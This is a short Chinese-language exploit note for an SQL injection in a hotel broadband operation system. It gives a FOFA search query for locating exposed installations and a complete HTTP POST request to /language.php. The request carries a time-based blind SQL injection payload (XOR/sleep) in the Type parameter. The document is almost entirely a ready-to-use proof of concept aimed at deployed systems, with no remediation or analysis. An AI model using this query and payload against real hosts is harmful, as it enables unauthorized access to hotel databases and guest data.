## 安美数字酒店宽带运营系统SQL注入漏洞


## fofa
```
title=酒店宽带运营系统
```

## POC
```
POST /language.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 263
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Host: 
Connection: Keep-alive

EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5
```
